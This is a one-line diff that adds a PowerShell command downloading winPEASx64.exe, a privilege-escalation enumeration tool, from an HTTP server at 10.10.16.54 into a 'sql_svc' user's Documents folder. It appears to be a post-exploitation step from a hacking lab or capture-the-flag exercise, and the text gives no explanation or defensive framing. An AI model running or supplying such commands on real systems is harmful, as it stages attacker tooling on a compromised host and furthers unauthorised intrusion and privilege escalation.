@@ -1,0 +1,1 @@
+(New-Object Net.WebClient).DownloadFile('http://10.10.16.54:8000/winPEASx64.exe','\Users\sql_svc\Documents\winPEASx64.exe')
